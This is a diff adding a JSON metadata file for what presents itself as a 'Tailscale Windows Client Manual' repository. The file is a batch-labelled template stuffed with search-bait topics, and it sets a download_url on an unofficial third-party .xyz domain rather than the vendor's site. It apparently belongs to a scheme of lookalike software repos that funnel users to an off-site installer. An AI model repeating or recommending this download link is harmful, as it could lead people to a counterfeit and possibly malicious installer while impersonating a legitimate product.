@@ -1,0 +1,25 @@
+{
+  "repo": "tailscale-windows-client-manual",
+  "product": "Tailscale Windows Client Manual",
+  "kind": "guide",
+  "install_type": "download",
+  "download_url": "https://tailscale-client.mefidirect.xyz/",
+  "batch": "new33",
+  "format": "license-md-only",
+  "category": "guide",
+  "topics": [
+    "tailscale-faq",
+    "tailscale-download-page",
+    "tailscale-client-windows",
+    "install-tailscale-windows",
+    "tailscale-getting-started",
+    "tailscale-release",
+    "workflow",
+    "toolkit",
+    "utility",
+    "configuration",
+    "deployment",
+    "office-ready",
+    "daily-driver"
+  ]
+}
